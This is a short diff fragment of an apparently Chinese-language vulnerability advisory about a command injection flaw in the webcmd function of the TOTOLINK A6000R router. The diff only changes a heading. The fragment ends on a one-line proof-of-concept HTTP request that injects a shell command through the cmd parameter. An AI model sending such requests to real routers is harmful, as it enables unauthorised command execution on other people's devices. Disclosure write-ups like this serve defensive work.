@@ -2,7 +2,7 @@
 
 TOTOLINK A6000R是一款性能卓越的无线路由器，采用先进的技术和设计，为用户提供出色的网络体验。其支持最新的Wi-Fi标准，可实现高速稳定的无线连接，适用于各种网络需求，包括流畅的高清视频流、快速的在线游戏和大规模文件传输。双频段支持让用户可以根据需求选择最佳的无线信号频段，确保网络稳定性和速度。此设备中的[webcmd](https://cn-sec.com/archives/tag/webcmd) 函数中存在命令注入漏洞，攻击者可以通过webcmd 函数中的cmd参数包含命令，进行命令执行攻击。
 
-## poc
+## POC
 
 ```java
 GET /cgi-bin/luci/admin/mtk/webcmd?cmd=ls%20/>/www/555.txt HTTP/1.1
